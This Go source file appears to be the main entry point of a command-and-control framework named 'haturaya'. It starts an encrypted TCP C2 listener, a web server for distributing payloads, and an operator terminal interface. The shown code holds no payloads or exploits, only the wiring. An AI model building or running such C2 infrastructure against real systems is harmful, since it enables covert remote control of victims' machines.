package main

import (
	"fmt"
	"log"
	"os"
	"strconv"

	tea "github.com/charmbracelet/bubbletea"

	"haturaya/internal/c2"
	hcrypto "haturaya/internal/crypto"
	"haturaya/internal/tui"
	"haturaya/internal/web"
)

func main() {
	if len(os.Args) != 4 {
		fmt.Fprintf(os.Stderr, "Usage: %s <host> <c2-port> <web-port>\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "Example: %s 0.0.0.0 9999 9090\n", os.Args[0])
		os.Exit(1)
	}

	host := os.Args[1]

	c2Port, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Fprintf(os.Stderr, "invalid c2-port: %v\n", err)
		os.Exit(1)
	}

	webPort, err := strconv.Atoi(os.Args[3])
	if err != nil {
		fmt.Fprintf(os.Stderr, "invalid web-port: %v\n", err)
		os.Exit(1)
	}

	// Generate a fresh session encryption key.
	ciph, err := hcrypto.New()
	if err != nil {
		log.Fatalf("crypto init: %v", err)
	}

	// Create the C2 server (TCP listener, not yet started).
	srv := c2.New(host, c2Port, webPort, ciph)

	// Start the web payload-distribution server in the background.
	webSrv := web.New(host, webPort)
	go func() {
		if err := webSrv.Start(); err != nil {
			log.Printf("[web] server error: %v", err)
		}
	}()

	// Build the TUI model.
	m := tui.New(host, c2Port, webPort, ciph, srv.Registry())

	// Create the Bubble Tea program.
	p := tea.NewProgram(m, tea.WithAltScreen(), tea.WithMouseCellMotion())

	// Wire the program into the C2 server so handlers can send TUI messages.
	srv.SetProgram(p)

	// Start the TCP listener in the background.
	go func() {
		if err := srv.ListenAndServe(); err != nil {
			log.Printf("[c2] listener error: %v", err)
		}
	}()

	// Run the TUI — blocks until the operator exits (Ctrl+C or "exit").
	if _, err := p.Run(); err != nil {
		log.Fatalf("tui: %v", err)
	}
}
